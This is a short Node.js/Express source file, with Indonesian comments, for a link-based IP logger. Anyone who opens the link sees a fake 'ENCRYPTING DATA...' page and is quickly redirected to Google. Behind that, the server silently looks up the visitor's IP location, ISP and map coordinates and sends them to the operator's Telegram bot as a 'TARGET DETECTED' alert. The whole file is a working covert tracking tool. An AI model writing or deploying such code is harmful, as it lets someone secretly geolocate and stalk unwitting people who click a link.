const express = require('express');
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const app = express();

// Ambil dari Variables Railway
const token = process.env.BOT_TOKEN;
const adminId = process.env.ADMIN_ID;
const bot = new TelegramBot(token, {polling: true});

app.get('/', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // Tampilan Hacker
    res.send(`
        <body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;">
            <h2>ENCRYPTING DATA...</h2>
            <script>setTimeout(()=>{window.location.href="https://www.google.com"},2000);</script>
        </body>
    `);

    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        const d = response.data;
        const msg = `📍 **TARGET DETECTED**\nIP: ${d.query}\nCity: ${d.city}\nISP: ${d.isp}\nMaps: https://www.google.com/maps?q=${d.lat},${d.lon}`;
        bot.sendMessage(adminId, msg);
    } catch (e) {
        console.log("Error tracking");
    }
});

// RAILWAY WAJIB PAKE PORT DYNAMIC
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log('Server is running on port ' + PORT);
});
